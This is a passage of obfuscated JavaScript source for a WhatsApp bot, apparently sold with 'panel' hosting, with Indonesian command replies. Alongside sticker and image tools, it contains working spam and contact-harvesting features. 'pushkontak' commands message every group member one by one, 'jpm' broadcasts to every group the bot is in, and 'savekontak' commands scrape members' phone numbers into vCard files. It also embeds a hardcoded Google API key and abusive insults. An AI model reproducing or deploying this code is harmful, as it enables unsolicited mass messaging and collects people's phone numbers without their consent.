          let _0x2a4ebe = Object.entries(_0x1d6ebc).slice(0).map(_0x1402b4 => _0x1402b4[1]);
          let _0x596f8e = _0x2a4ebe.map(_0x7f0c42 => _0x7f0c42.id);
          let _0x50cda4 = "⬣ *LIST GROUP BY dray*\n\nTotal Group : " + _0x596f8e.length + " Group\n\n";
          for (let _0x2d973a of _0x596f8e) {
            let _0x101181 = await _0x554af5.groupMetadata(_0x2d973a);
            _0x50cda4 += "◉ Nama : " + _0x101181.subject + "\n◉ ID : " + _0x101181.id + "\n◉ Member : " + _0x101181.participants.length + "\n\n────────────────────────\n\n";
          }
          _0x3f20c7(_0x50cda4 + ("Untuk Penggunaan Silahkan Ketik Command " + _0x505e97 + "pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas"));
        }
        break;
      case "pushkontakid":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.owner);
          }
          let _0x5b459b = _0x2ece04.split("|")[0];
          let _0x3e4600 = _0x2ece04.split("|")[1];
          if (!_0x5b459b && !_0x3e4600) {
            return _0x3f20c7("Example: " + (_0x505e97 + _0x3c8344) + " idgc|pesan");
          }
          let _0x2f1225 = await _0x554af5.groupMetadata(_0x5b459b).catch(_0x122dc2 => _0x3f20c7(_0x122dc2));
          let _0x57cf7d = await _0x2f1225.participants.filter(_0x3c6115 => _0x3c6115.id.endsWith(".net")).map(_0x315901 => _0x315901.id);
          let _0x57afc9 = _0x57cf7d.length;
          let _0xe4e454 = 0;
          _0x3f20c7("*BOT BY dray*\n\n*Member: " + _0x57cf7d.length + "*\n*Waktu: " + _0x57cf7d.length * 7 + " detik*");
          for (let _0x448634 = 0; _0x448634 < _0x57cf7d.length; _0x448634++) {
            setTimeout(function () {
              _0x554af5.sendMessage(_0x57cf7d[_0x448634], {
                text: _0x3e4600
              });
              _0x57afc9--;
              _0xe4e454++;
              if (_0x57afc9 === 0) {
                _0x3f20c7("Pushkontak completed Mau save kontak ketik .savekontakid");
              }
            }, _0x448634 * 7000);
          }
        }
        break;
      case "pushkontakgc":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.owner);
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x3f20c7("Khusus Di Grup Bang");
          }
          if (!_0x2ece04) {
            return _0x3f20c7("Teks Nya Kak?");
          }
          let _0x1b8204 = await _0xf906a3.filter(_0x155b78 => _0x155b78.id.endsWith(".net")).map(_0x1fe3aa => _0x1fe3aa.id);
          let _0x301bfd = "" + q;
          _0x3f20c7("*BOT BY dray*\n\n*SEDANG MELAKSANAKAN PUSH*");
          for (let _0x2ffe15 of _0x1b8204) {
            await sleep(7000);
            _0x554af5.sendMessage(_0x2ffe15, {
              text: "" + _0x301bfd
            }, {
              quoted: _0x1e3598
            });
          }
          _0x3f20c7("Pushkontak completed Mau save kontak ketik .savekontak");
        }
        break;
      case "savekontak":
      case "svkontak":
        if (!_0x439cd6) {
          return _0x3f20c7("Khusus Dray Store");
        }
        if (!_0x4a73b4) {
          return _0x5dd2ef.reply("Khusus Group Kontol");
        }
        let _0x1dc29f = await _0x554af5.groupMetadata(_0x5dd2ef.chat);
        let _0x29b1f8 = _0xf906a3.map(_0x2399cc => _0x2399cc.id);
        vcard = "";
        noPort = 0;
        for (let _0x574695 of _0x1dc29f.participants) {
          vcard += "BEGIN:VCARD\nVERSION:3.0\nFN:[" + noPort++ + "] " + global.save + "-" + _0x574695.id.split("@")[0] + "\nTEL;type=CELL;type=VOICE;waid=" + _0x574695.id.split("@")[0] + ":+" + _0x574695.id.split("@")[0] + "\nEND:VCARD\n";
        }
        let _0x7d9bcf = "./contacts.vcf";
        _0x3f20c7("*Mengimpor " + _0x1dc29f.participants.length + " kontak..*");
        fs.writeFileSync(_0x7d9bcf, vcard.trim());
        await sleep(2000);
        _0x554af5.sendMessage(_0x5dd2ef.chat, {
          document: fs.readFileSync(_0x7d9bcf),
          mimetype: "text/vcard",
          fileName: "Contact.vcf",
          caption: "GROUP: *" + _0x1dc29f.subject + "*\nMEMBER: *" + _0x1dc29f.participants.length + "*"
        }, {
          ephemeralExpiration: 86400,
          quoted: _0x5dd2ef
        });
        fs.unlinkSync(_0x7d9bcf);
        break;
      case "idgc":
      case "getkontak":
        if (!_0x439cd6) {
          return _0x3f20c7("Khusus Bang Dray");
        }
        if (!_0x4a73b4) {
          return _0x5dd2ef.reply("Khusus Group Kontol");
        }
        huhuhs = await _0x554af5.sendMessage(_0x5dd2ef.chat, {
          text: "*ID : " + _0x379cf7.id + "\n\nJangan Lupa Di Salin Idnya Yah Bang dray*"
        }, {
          quoted: _0x5dd2ef,
          ephemeralExpiration: 86400
        });
        await sleep(1000);
        _0x3f20c7;
        break;
      case "jpm":
        {
          if (!_0x439cd6) {
            return _0x3f20c7("Khusus Dray Gamteng");
          }
          if (!_0x2ece04) {
            throw "Text mana?\n\nExample : " + (_0x505e97 + _0x3c8344) + " dray Ganteng";
          }
          let _0x24c6f5 = await _0x554af5.groupFetchAllParticipating();
          let _0x271ab6 = Object.entries(_0x24c6f5).slice(0).map(_0x1fde55 => _0x1fde55[1]);
          let _0x415d5b = _0x271ab6.map(_0x48f04b => _0x48f04b.id);
          _0x5dd2ef.reply("Mengirim Jpm Ke " + _0x415d5b.length + " Group Chat, Waktu Selesai " + _0x415d5b.length * 1.5 + " detik");
          for (let _0x4bc4e3 of _0x415d5b) {
            await sleep(500);
            _0x554af5.sendMessage(_0x4bc4e3, {
              text: "" + _0x2ece04
            }, {
              quoted: _0x5dd2ef
            });
          }
          _0x5dd2ef.reply("Sukses Mengirim Broadcast Ke " + _0x415d5b.length + " Group");
        }
        break;
      case "savekontakid":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply(mess.only.owner);
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup");
          }
          var _0xb3c998 = _0x2ece04;
          var _0xe568f;
          try {
            _0xe568f = await _0x554af5.groupMetadata("" + _0xb3c998);
          } catch (_0x4e2e77) {
            return _0x5dd2ef.reply("*ID Grup* tidak valid!");
          }
          const _0x24cc5f = await _0xe568f.participants;
          const _0x4c56e8 = await _0x24cc5f.filter(_0x51a047 => _0x51a047.id.endsWith(".net")).map(_0x4d6501 => _0x4d6501.id);
          for (let _0x37655a of _0x4c56e8) {
            if (_0x37655a !== _0x5dd2ef.sender) {
              _0x4af9fb.push(_0x37655a);
              fs.writeFileSync("./database/dray/contacts.json", JSON.stringify(_0x4af9fb));
            }
          }
          try {
            const _0x4e40f8 = [...new Set(_0x4af9fb)];
            const _0x33eaa3 = _0x4e40f8.map((_0x209ba5, _0x504b59) => {
              const _0xa75a00 = ["BEGIN:VCARD", "VERSION:3.0", "FN:" + global.save + " " + _0x209ba5.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x209ba5.split("@")[0] + ":+" + _0x209ba5.split("@")[0], "END:VCARD", ""].join("\n");
              return _0xa75a00;
            }).join("");
            fs.writeFileSync("./database/dray/contacts.vcf", _0x33eaa3, "utf8");
          } catch (_0x1658d7) {
            _0x5dd2ef.reply(_0x1658d7.toString());
          } finally {
            if (_0x5dd2ef.chat !== _0x5dd2ef.sender) {
              await _0x5dd2ef.reply("File Kontak Berhasil Dikirim ke Private Chat");
            }
            await _0x554af5.sendMessage(_0x5dd2ef.sender, {
              document: fs.readFileSync("./database/dray/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x5dd2ef
            });
            _0x4af9fb.splice(0, _0x4af9fb.length);
            await fs.writeFileSync("./database/dray/contacts.json", JSON.stringify(_0x4af9fb));
            await fs.writeFileSync("./database/dray/contacts.vcf", "");
          }
        }
        break;
      case "toimage":
      case "toimg":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("*Lu Di Ban Owner Gak Usah Sok asik Tolol*");
          }
          await _0x3f20c7(mess.wait);
          if (!_0x5c113a) {
            throw "Reply Image";
          }
          if (!/webp/.test(_0xb4c66d)) {
            throw "Balas sticker dengan caption *" + (_0x505e97 + _0x3c8344) + "*";
          }
          let _0x124d9b = await _0x554af5.downloadAndSaveMediaMessage(_0x5c113a);
          let _0x222469 = await getRandom(".png");
          exec("ffmpeg -i " + _0x124d9b + " " + _0x222469, _0x247ae5 => {
            fs.unlinkSync(_0x124d9b);
            if (_0x247ae5) {
              throw _0x247ae5;
            }
            let _0x1c21fb = fs.readFileSync(_0x222469);
            _0x554af5.sendMessage(_0x2f68f6, {
              image: _0x1c21fb
            }, {
              quoted: _0x5dd2ef
            });
            fs.unlinkSync(_0x222469);
          });
        }
        break;
      case "sticker":
      case "s":
      case "stickergif":
      case "sgif":
        {
          if (!_0x5c113a) {
            throw "Balas Video/Image Dengan Caption " + (_0x505e97 + _0x3c8344);
          }
          if (/image/.test(_0xb4c66d)) {
            let _0x1990bf = await _0x5c113a.download();
            let _0x41f882 = await _0x554af5.sendImageAsSticker(_0x2f68f6, _0x1990bf, _0x5dd2ef, {
              packname: global.packname,
              author: global.author
            });
            await fs.unlinkSync(_0x41f882);
          } else if (/video/.test(_0xb4c66d)) {
            if ((_0x5c113a.msg || _0x5c113a).seconds > 11) {
              return _0x5dd2ef.reply("Maksimal 10 detik!");
            }
            let _0x250734 = await _0x5c113a.download();
            let _0x96f92f = await _0x554af5.sendVideoAsSticker(_0x2f68f6, _0x250734, _0x5dd2ef, {
              packname: global.packname,
              author: global.author
            });
            await fs.unlinkSync(_0x96f92f);
          } else {
            throw "Kirim Gambar/Video Dengan Caption " + (_0x505e97 + _0x3c8344) + "\nDurasi Video 1-9 Detik";
          }
        }
        break;
      case "telegraph":
      case "tourl":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("*Lu Di Ban Owner Gak Usah Sok asik Tolol*");
          }
          await _0x3f20c7(mess.wait);
          if (!/video/.test(_0xb4c66d) && !/image/.test(_0xb4c66d)) {
            throw "*Send/Reply the Video/Image With Caption* " + (_0x505e97 + _0x3c8344);
          }
          if (!_0x5c113a) {
            throw "*Send/Reply the Video/Image Caption* " + (_0x505e97 + _0x3c8344);
          }
          let {
            UploadFileUgu: _0x50fcef,
            webp2mp4File: _0x254087,
            TelegraPh: _0x494b55
          } = require("./database/uploader");
          let _0x53cdff = await _0x554af5.downloadAndSaveMediaMessage(_0x5c113a);
          if (/image/.test(_0xb4c66d)) {
            let _0x2af3c2 = await _0x494b55(_0x53cdff);
            _0x5dd2ef.reply(util.format(_0x2af3c2));
          } else if (!/image/.test(_0xb4c66d)) {
            let _0x432695 = await _0x50fcef(_0x53cdff);
            _0x5dd2ef.reply(util.format(_0x432695));
          }
          await fs.unlinkSync(_0x53cdff);
        }
        break;
      case "qc":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply("Khusus Bang Dray");
          }
          let _0x7934a5 = _0x5dd2ef.quoted && _0x5dd2ef.quoted.q ? _0x5dd2ef.quoted.text : q ? q : "";
          if (!_0x7934a5) {
            return _0x5dd2ef.reply("Cara Penggunaan " + _0x505e97 + "qc teks");
          }
          const _0x642677 = "" + _0x7934a5;
          const _0x47bbfe = await _0x554af5.getName(_0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x5dd2ef.sender);
          const _0x4ab321 = await _0x554af5.profilePictureUrl(_0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x5dd2ef.sender, "image").catch(() => "https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png");
          const _0x3c8c1a = {
            type: "quote",
            format: "png",
            backgroundColor: "#FFFFFF",
            width: 700,
            height: 580,
            scale: 2,
            messages: [{
              entities: [],
              avatar: true,
              from: {
                id: 1,
                name: _0x47bbfe,
                photo: {
                  url: _0x4ab321
                }
              },
              text: _0x642677,
              replyMessage: {}
            }]
          };
          axios.post("https://bot.lyo.su/quote/generate", _0x3c8c1a, {
            headers: {
              "Content-Type": "application/json"
            }
          }).then(async _0x300485 => {
            const _0x18a303 = Buffer.from(_0x300485.data.result.image, "base64");
            let _0x46f66f = await _0x554af5.sendImageAsSticker(_0x5dd2ef.chat, _0x18a303, _0x5dd2ef, {
              packname: global.packname,
              author: global.author,
              categories: ["🤩", "🎉"],
              id: "12345",
              quality: 100,
              background: "transparent"
            });
            await fs.unlinkSync(_0x46f66f);
          });
        }
        break;
      case "remini":
      case "hd":
        {
          if (!_0x439cd6) {
            return _0x3f20c7("Ngapain ? Fitur Ini Buat Bang Dray");
          }
          if (!_0x5c113a) {
            return _0x3f20c7("Fotonya Mana?");
          }
          if (!/image/.test(_0xb4c66d)) {
            return _0x3f20c7("Send/Reply Foto Dengan Caption " + (_0x505e97 + _0x3c8344));
          }
          _0x3f20c7(mess.wait);
          let _0x9aa645 = await _0x5c113a.download();
          let _0xf58b2f = await remini(_0x9aa645, "enhance");
          _0x554af5.sendMessage(_0x5dd2ef.chat, {
            image: _0xf58b2f,
            caption: "🍁 Ini Hasilnya Kak..."
          }, {
            quoted: _0x5dd2ef
          });
          await sleep(5000);
        }
        break;
      case "wmvideo":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply(mess.only.owner);
          }
          let _0x5342d3 = "" + _0x2ece04;
          {
            if ((_0x5c113a.msg || _0x5c113a).seconds > 11) {
              return _0x5dd2ef.reply("Maksimal 10 detik!");
            }
            if (/video/.test(_0xb4c66d)) {
              let _0x3ee5ac = await _0x5c113a.download();
              let _0x56f7ed = await _0x554af5.sendVideoAsSticker(_0x2f68f6, _0x3ee5ac, _0x5dd2ef, {
                packname: "" + _0x5342d3,
                author: "" + botname
              });
              await fs.unlinkSync(_0x56f7ed);
            } else {
              throw "Kirim Gambar/Video Dengan Caption " + (_0x505e97 + _0x3c8344) + "\nDurasi Video 1-9 Detik";
            }
          }
        }
        break;
      case "wm":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply(mess.only.owner);
          }
          let _0x4a0376 = "" + _0x2ece04;
          {
            if (!_0x5c113a) {
              throw "Balas Video/Image Dengan Caption " + (_0x505e97 + _0x3c8344);
            }
            if (/image/.test(_0xb4c66d)) {
              let _0x2bd863 = await _0x5c113a.download();
              let _0x2f4e49 = await _0x554af5.sendImageAsSticker(_0x2f68f6, _0x2bd863, _0x5dd2ef, {
                packname: "" + _0x4a0376,
                author: "" + botname
              });
              await fs.unlinkSync(_0x2f4e49);
            }
          }
        }
        break;
      case "emojimix":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply(mess.only.owner);
          }
          let [_0x5e1a63, _0x5aabf4] = _0x2ece04.split`+`;
          if (!_0x5e1a63) {
            throw "Example : " + (_0x505e97 + _0x3c8344) + " 😅+🤔";
          }
          if (!_0x5aabf4) {
            throw "Example : " + (_0x505e97 + _0x3c8344) + " 😅+🤔";
          }
          let _0x11ff16 = await fetchJson("https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=" + encodeURIComponent(_0x5e1a63) + "_" + encodeURIComponent(_0x5aabf4));
          for (let _0x165bca of _0x11ff16.results) {
            let _0x4df02c = await _0x554af5.sendImageAsSticker(_0x2f68f6, _0x165bca.url, _0x5dd2ef, {
              packname: global.packname,
              author: global.author,
              categories: _0x165bca.tags
            });
            await fs.unlinkSync(_0x4df02c);
          }
        }
        break;
      case "owner":
        {
          const _0x3e28f1 = await _0x554af5.sendMessage(_0x2f68f6, {
            contacts: {
              displayName: _0x170823.length + " Kontak",
              contacts: _0x170823
            },
            contextInfo: {
              forwardingScore: 9999999,
              isForwarded: true,
              mentionedJid: [_0x3594d7]
            }
          }, {
            quoted: _0x5dd2ef
          });
          _0x554af5.sendMessage(_0x2f68f6, {
            text: "Hai Kak @" + _0x3594d7.split("@")[0] + ", Ini Owner Ku Kak Kalo Mau Buy Panel Ke Dia Aja",
            contextInfo: {
              forwardingScore: 9999999,
              isForwarded: true,
              mentionedJid: [_0x3594d7]
            }
          }, {
            quoted: _0x3e28f1
          });
        }
        break;
      case "tagall":
        {
          if (!_0x439cd6) {
            return _0x5dd2ef.reply(mess.only.owner);
          }
          if (!_0x5c5d5c) {
            return _0x3f20c7(mess.only.badmin);
          }
          if (!_0x4a73b4) {
            return _0x3f20c7(mess.only.group);
          }
          if (!q) {
            return _0x3f20c7("Teks nya mana mek ?");
          }
          let _0x5143eb = (q ? q : "") + "\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎